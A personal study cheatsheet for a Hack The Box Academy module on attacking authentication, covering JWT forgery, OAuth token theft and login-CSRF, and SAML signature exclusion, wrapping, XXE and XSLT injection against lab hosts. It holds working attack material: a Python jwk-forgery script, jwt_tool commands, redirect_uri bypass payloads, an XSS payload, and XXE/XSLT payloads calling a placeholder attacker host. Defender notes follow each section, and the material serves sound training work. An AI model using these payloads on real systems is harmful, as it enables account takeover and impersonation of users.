Personal Cheatsheet over the Attacking Authentication Mechanisms module from https://academy.hackthebox.com/

Focus of this part: JWTs — what they are, and how to forge/tamper them to escalate privileges.

== JWT Basics ==
A JWT (JSON Web Token) = a way to format data (claims) passed between parties.
Standards: JWS (signature, what web apps use) / JWE (encryption) + JWK (key format) + JWA (algorithms).
3 parts, base64url-encoded, dot-separated:  header.payload.signature

  Header  -> metadata: { "alg": "HS256", "typ": "JWT" }   (alg = signing algo)
  Payload -> the claims/data: { "user": "admin", "isAdmin": true, "exp": ... }
  Signature -> HMAC/sign(header + payload + SECRET KEY) with the algo from "alg".
               Protects integrity: tamper anything -> signature no longer matches.
               Forging a valid signature requires knowing the secret key.

alg values: HS256/384/512 (HMAC, symmetric) | RS/ES/PS* (asymmetric) | none (no signature).
Tools to decode/forge: jwt.io (read-only now), jwt.lannysport.net (edit payload), CyberChef (JWT Sign/Verify).

== JWT-based Auth (why it's a target) ==
Stateful  : server stores session, client sends an opaque token, server looks it up in DB.
Stateless : the JWT itself carries the user data (claims). Server only verifies signature, trusts the claims.
=> If we can tamper the payload AND get it accepted, we control our own identity/privileges.
Goal in all attacks below: flip a claim like  "isAdmin": false -> true  and get it accepted.

== Attack 1: Missing Signature Verification ==
What we test: does the app actually verify the signature?
Method:
  1. Login, grab the JWT from the session cookie.
  2. Decode payload, set "isAdmin": true, re-encode (jwt.io / lannysport).
  3. Send the tampered JWT in the session cookie to a protected route (e.g. GET /home).
If the app accepts it (admin granted) -> it never verified the signature. Misconfig win.

== Attack 2: None Algorithm ==
What we test: does the app accept alg=none (no signature expected)?
Method (CyberChef -> JWT Sign, Signing algorithm = None):
  1. Set header  "alg": "none".
  2. Set payload  "isAdmin": true.
  3. Forge token = header.payload.   (trailing dot, EMPTY signature)
  4. Send in session cookie.
If accepted -> app trusts alg=none and skips verification.
  Forged token shape:  eyJhbGciOiJub25lIi...   .   eyJ1c2VyIj...   .   (nothing after last dot)

== Attack 3: Algorithm Confusion (RS256 -> HS256) ==
Idea: force the app to verify with a different algo than it signed with.
  - Asymmetric (RS256): sign with PRIVATE key, verify with PUBLIC key (public = known).
  - Symmetric (HS256): same key signs AND verifies.
  - If the app picks the verify algo from the token's "alg", we set alg=HS256 and sign the token
    using the app's PUBLIC key as the HMAC secret. App verifies HS256 with that public key -> valid.
Precondition: app honors the alg claim (not hardcoded to RS256). Fix = hardcode the algo.

Step 1 — Get the public key:
  - Often published by the app. If not, recover it from 2 JWTs signed with the same key.
  - Tool: silentsignal/rsa_sign2n (Docker).
      git clone https://github.com/silentsignal/rsa_sign2n
      cd rsa_sign2n/standalone/ && docker build . -t sig2n
      docker run --rm -it sig2n
      # inside: feed two different JWTs (collect via repeated login in Burp Repeater)
      uv run jwt_forgery.py <JWT1> <JWT2>
  - Outputs public-key candidates (.pem) + ready-made HS256 tampered JWTs to test the vuln.
  - Multiple candidates? rerun with more/different JWTs to narrow down.
  - Confirm vuln: send a tool-generated HS256 JWT -> if accepted (200), app is vulnerable.

Step 2 — Forge the admin token (CyberChef -> JWT Sign):
  1. Signing algorithm = HS256.
  2. Private/Secret key field = paste the recovered public key .pem  (add a trailing newline \n !).
  3. Payload  "isAdmin": true.
  4. Send the forged JWT -> admin access.
  Note: recent CyberChef can't sign JWTs -> use an older local version.

== Attack 4: Reusing JWT Secrets (cross-app) ==
Multiple apps from the same company MUST use different signing secrets.
If app A (socialA.htb, role=moderator) and app B (socialB.htb, role=user) share the SAME secret
and both encode the privilege in the JWT -> reuse your high-priv JWT from A on B to gain those privs on B.
Test: take a valid JWT from a more-privileged app, send it to the target app. Accepted = shared secret.

== Attack 5: Header-injected keys — forge with our OWN key ==
The JWS header can carry the verification key. If the app trusts it, we supply our own key and sign with it.
Generate a keypair once:
  openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
  openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem

  jwk claim — public key embedded directly in the header.
    Plan: set payload isAdmin=true, set header "jwk" = OUR public key (JWK form), sign with OUR private key.
    The app verifies with the attacker-supplied key -> accepted.
    Forge (pip3 install pyjwt cryptography python-jose):
      from cryptography.hazmat.backends import default_backend
      from cryptography.hazmat.primitives import serialization
      from jose import jwk; import jwt
      jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}
      pub = serialization.load_pem_public_key(open('exploit_public.pem','rb').read(), backend=default_backend())
      jwk_dict = jwk.construct(pub, algorithm='RS256').to_dict()
      token = jwt.encode(jwt_payload, open('exploit_private.pem','rb').read(),
                         algorithm='RS256', headers={'jwk': jwk_dict})
      print(token)

  jku claim — URL pointing to a JWK Set instead of embedding it.
    Same idea: host our public key (JWK Set) on our server, set header "jku" = that URL, sign with our private key.
    Bonus: a poorly-validated jku can also give blind GET-based SSRF (see Server-side Attacks module).

  Other key-source claims (exploit similarly):
    x5c / x5u  -> like jwk/jku but carry a CERTIFICATE / cert-chain instead of a raw key.
    kid        -> identifies which key to use. If passed unsanitized to a lookup -> path traversal / SQLi /
                  command injection. Needs severe misconfig, rare in the wild.

== Tooling: jwt_tool (ticarpi) ==
All-in-one JWT analyzer/forger/cracker — automates every attack above.
  git clone https://github.com/ticarpi/jwt_tool && pip3 install -r jwt_tool/requirements.txt
  python3 jwt_tool/jwt_tool.py            # first run builds jwtconf.ini (set httplistener for OOB checks)

Analyze (just pass the token): decodes header/payload, flags expired exp, shows timestamps.
  python3 jwt_tool/jwt_tool.py <JWT>

Exploit flags (-X):
  a = alg:none      n = null signature      b = blank password accepted
  s = spoof JWKS (-ju <url>)                k = key confusion / algo confusion (-pk <pubkey>)
  i = inject inline JWKS (jwk)
Tamper claims:  -pc <claim> -pv <value> -I   (e.g. -pc isAdmin -pv true -I)
  Example (forge none-alg admin token):
    python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I <JWT>
    -> outputs none/None/NONE/nOnE variants to dodge case-based blacklists.
Crack HMAC secret:  -C -d <wordlist>  (or -p <pass> / -kf <keyfile>).

== Prevention (defender notes) ==
- Plan & document the JWT config: signature algo + which claims the app uses.
- Don't roll your own JWT logic -> use a maintained, up-to-date library.
- Pin the config: reject tokens not signed with the EXPECTED algo (kills none + algo confusion).
- jku/jwk/etc: whitelist allowed hosts before fetching remote keys (prevents SSRF + key injection).
- Always set exp so tokens aren't valid forever.


########################################  OAUTH 2.0  ########################################

== OAuth flow recap (Authorization Code) ==
Actors: Resource Owner (user) | Client (the app, e.g. academy.htb) | Authorization Server (e.g. hubgit.htb).
  1. Client sends user to auth server:  /auth?response_type=code&client_id=..&redirect_uri=..&state=..
  2. User logs in / consents.
  3. Auth server redirects to redirect_uri with a one-time  code  (+ state echoed back).
  4. Client exchanges code -> access_token (backchannel).
  5. Client uses access_token to act as the user.
state = anti-CSRF, must stay consistent through the flow. client_id = public (grab it by running the flow yourself).

== Attack: Stealing Access Tokens via redirect_uri ==
Root cause: auth server doesn't strictly validate redirect_uri -> attacker points it at their own server,
so the victim's authorization code lands in attacker's logs. Then attacker completes the flow = full impersonation.
Method:
  1. Recon: run OAuth yourself, note the client_id.
  2. Craft a malicious auth link with redirect_uri = attacker server:
       http://hubgit.htb/authorization/auth?response_type=code&client_id=0e8f12335b0bf225
         &redirect_uri=http://attacker.htb/callback&state=somevalue
  3. Deliver to victim (social engineering, out of scope). Victim logs in -> 303 redirect to attacker.htb/callback?code=..&state=..
  4. Read the code from attacker logs:  curl http://attacker.htb/log
  5. Complete the flow: replay the code to the CLIENT's callback (state as cookie) to exchange it for the access_token:
       GET /client/callback?code=<CODE>&state=somevalue   Host: hubgit.htb   Cookie: state=somevalue
     -> response Set-Cookie: access_token=<victim JWT>.
  6. Impersonate: send that access_token cookie to the client (academy.htb) -> logged in as the victim.
Fix = auth server must enforce an exact-match allowlist of redirect_uri values per client.
Lab exfil: attacker.htb logs all params/headers of any request; read them at /log (curl http://attacker.htb/log).

== Attack: Bypassing flawed redirect_uri validation ==
When redirect_uri IS validated (whitelist) you get "Invalid redirect URI" (401). If the check is naive
(startswith / contains "http://academy.htb"), bypass it. First learn the expected value by running the flow yourself.
Payloads (redirect_uri) abusing URL structure:
  http://academy.htb.attacker.htb/callback     # subdomain trick
  http://academy.htb@attacker.htb/callback      # basic-auth userinfo (real host = attacker.htb)
  http://attacker.htb/callback?a=http://academy.htb   # query param
  http://attacker.htb/callback#http://academy.htb     # fragment
Once one passes (200), run the token-stealing attack as above.

== Attack: Missing/weak state -> Login-CSRF ==
state = anti-CSRF token (optional but recommended). If missing or predictable -> log the VICTIM into the ATTACKER's account.
Impact: victim adds data (payment info, etc.) to attacker's account thinking it's theirs -> attacker harvests it.
Method:
  1. Attacker authenticates as THEMSELVES to get an authorization code tied to their account:
       POST /authorization/signin  username=attacker&password=attacker&client_id=..&redirect_uri=%2Fclient%2Fcallback
  2. Grab the code from the 303 redirect.
  3. Build the callback URL as the CSRF payload:  http://hubgit.htb/client/callback?code=<ATTACKER_CODE>
  4. Deliver to victim (phish). Victim's browser completes the flow -> victim now logged into attacker's account.
How state stops it: value is stored in victim's cookie; attacker's chosen state won't match -> "Invalid state" -> aborted.
=> Only works if state is missing OR predictable (must be unpredictable, like a CSRF token).

== Additional OAuth vulns (chaining) ==
Reflected XSS on the authorization request:
  client_id / redirect_uri / state are reflected as hidden form fields in the auth page.
  Unsanitized -> inject e.g. state=</...><script>alert(1)</script>. XSS on the AUTH SERVER = potential full account takeover.

Open redirect chaining (bypasses a CORRECT origin whitelist):
  If auth server whitelists origin http://academy.htb/ but the client has an open redirect (/redirect?url=..),
  point redirect_uri at it:  http://academy.htb/redirect?u=http://attacker.htb/callback
  Passes validation, then bounces the code to attacker.htb. Continue as in Stealing Access Tokens.

Malicious client (token reuse across clients):
  Attacker registers their own OAuth client evil.htb. Victim logs into evil.htb -> attacker gets victim's access_token.
  If academy.htb doesn't check the token was issued FOR ITSELF -> replay token there to impersonate the victim.

== OAuth Prevention (defender notes) ==
- Strictly follow the OAuth spec across ALL entities (client + auth + resource server).
- Enforce state (auth server) + implement it (client), even though spec makes it optional. Keep it unpredictable.
- Prefer authorization code grant over implicit.
- Auth server: strictly validate redirect_uri against trusted exact origins; reject anything else.
- Bind/verify access tokens to the client they were issued for (blocks malicious-client reuse).
- Store tokens securely, transmit over HTTPS only. Sanitize reflected params (anti-XSS). Add MFA. Regular audits/pentest/code review.


########################################  SAML  ########################################

== SAML recap ==
Actors: Principal (user) | Service Provider (SP, the app, academy.htb) | Identity Provider (IdP, sso.htb).
Flow: user hits SP -> redirected to IdP -> authenticates -> IdP returns a signed SAML Response (XML) to the SP's
ACS endpoint (/acs.php) via a POST param SAMLResponse. SP verifies the signature, then reads identity from the
<saml:Assertion> (name, email, id...) to log the user in.
Wire format: SAMLResponse is base64 THEN url-encoded. To edit -> url-decode -> base64-decode -> edit XML -> base64 -> url-encode.
The signature (ds:Signature) is what protects the assertion from tampering. All attacks = defeat / sidestep that signature.

== Attack: Signature Exclusion ==
Idea: some SPs only verify the signature IF one is present, and accept the response if it's absent.
Method:
  1. Decode the SAMLResponse to XML.
  2. Change the target attribute, e.g. <AttributeValue>htb-stdnt</> -> admin.
  3. Remove ALL <ds:Signature> nodes (there can be several: on the Response and/or the Assertion).
  4. Re-encode (base64 -> url-encode) and send.
If accepted -> SP skipped verification when no signature was found. (Just editing WITHOUT removing sig = "Invalid SAML Response".)

== Attack: Signature Wrapping (XSW) ==
Idea: create a mismatch between (a) what the signature-verification logic checks and (b) what the app logic reads.
Precondition: verifier finds the signed element via ds:Reference URI and validates it, but does NO extra checks
(e.g. doesn't count assertions); app logic reads identity from the FIRST assertion it finds.
Signature can protect the whole Response or just the Assertion; located as enveloped (inside signed elem) /
enveloping (wraps it) / detached (sibling). The ds:Reference URI="#<ID>" points at the signed element's ID.
Method (enveloped sig protecting the Assertion):
  1. Decode to XML, copy the original signed <saml:Assertion>.
  2. Make a forged copy: change its ID (e.g. _evilID) and its attributes (id=1, name=admin, email=admin@...); strip its signature.
  3. Inject the forged assertion BEFORE the original signed assertion inside <samlp:Response>.
     -> Response now has 2 assertions; the original (still signed & untouched) keeps the signature valid.
  4. Re-encode and send. Verifier validates the still-present signed assertion; app reads the FIRST (forged) one -> auth as admin.

== Attack: XXE via SAML ==
SAML is XML -> a misconfigured parser loading external entities is XXE-able.
Method: prepend a DOCTYPE with an external entity to the SAML XML, aim it at your host (blind = OOB confirm).
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER:8000"> %xxe; ]>
  <samlp:Response> ... </samlp:Response>
Re-encode, send, watch:  nc -lnvp 8000  -> inbound GET = vulnerable. Blind, so exfil is harder. (see Web Attacks module.)

== Attack: XSLT Server-Side Injection via SAML ==
If the parser processes XSLT, inject a stylesheet that fetches your server.
  <?xml version="1.0" encoding="utf-8"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/"><xsl:copy-of select="document('http://ATTACKER:8000/')"/></xsl:template>
  </xsl:stylesheet>
Re-encode, send, watch with nc. Inbound connection = vulnerable (even if the response itself is rejected as "Invalid").
If a bare payload fails, inject it into a <ds:Transform> node of a VALID SAML response (triggers only during valid parsing).

== Tooling: SAML Raider (Burp extension) ==
Install: Burp > Extensions > BApp Store > SAML Raider. Auto-highlights SAML requests.
In Repeater -> SAML Raider tab: "SAML Message Info" (decoded XML + issuer/sig/digest algos),
"SAML Attacks" tab -> one-click: Remove Signatures (sig exclusion), XXE, XSLT, all 8 XSW variants.
It re-encodes for you -> just resend in Repeater. No manual decode/encode.

== SAML Prevention (defender notes) ==
- Use an established, up-to-date SAML library (handles sig verification + assertion extraction correctly).
- Modern libs are patched against exclusion / wrapping / XXE / XSLT. See OWASP SAML Security Cheat Sheet.

